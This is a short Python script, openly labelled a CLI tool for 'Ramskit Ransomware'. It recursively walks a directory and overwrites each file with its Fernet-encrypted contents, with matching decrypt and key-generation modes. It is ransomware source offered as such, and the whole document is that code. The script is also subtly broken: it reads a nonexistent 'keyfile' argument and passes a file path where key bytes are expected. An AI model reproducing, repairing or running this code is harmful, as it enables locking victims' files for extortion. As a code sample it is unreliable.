#!/usr/bin/python3

import os
import sys
import argparse
from cryptography.fernet import Fernet

class Ramskit:
    def __init__(self, key):
        self.key = key
    
    def generate_key(self):
        key = Fernet.generate_key()
        with open('key.txt', 'wb') as f:
            f.write(key)
        return key

    def load_key(self):
        return open('key.txt', 'rb').read()
    
    def encrypt_file(self, items):
        for item in items:
            with open(item, 'rb') as f:
                data = f.read()

            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)
            
            with open(item, 'wb') as f:
                f.write(encrypted)

    def decrypt_file(self, items):
        for item in items:
            with open(item, 'rb') as f:
                data = f.read()

            fernet = Fernet(self.key)
            decrypted = fernet.decrypt(data)
            
            with open(item, 'wb') as f:
                f.write(decrypted)       

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
    parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
    parser.add_argument('-k', '--key', dest="key", help='Key file')
    parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
    args = parser.parse_args()

    action = args.action.lower()
    keyfile = args.keyfile
    path = args.path

    ramskit = Ramskit(keyfile)

    if action == 'encrypt':
        items = []
        for root, _, files in os.walk(path):
            for f in files:
                items.append(os.path.join(root, f))
        ramskit.encrypt_file(items)
    elif action == 'decrypt':
        items = []
        for root, _, files in os.walk(path):
            for f in files:
                items.append(os.path.join(root, f))
        ramskit.decrypt_file(items)
    elif action == 'generate_key':
        print(ramskit.generate_key())
    else:
        raise Exception('Invalid action: ', action)
        sys.exit(1)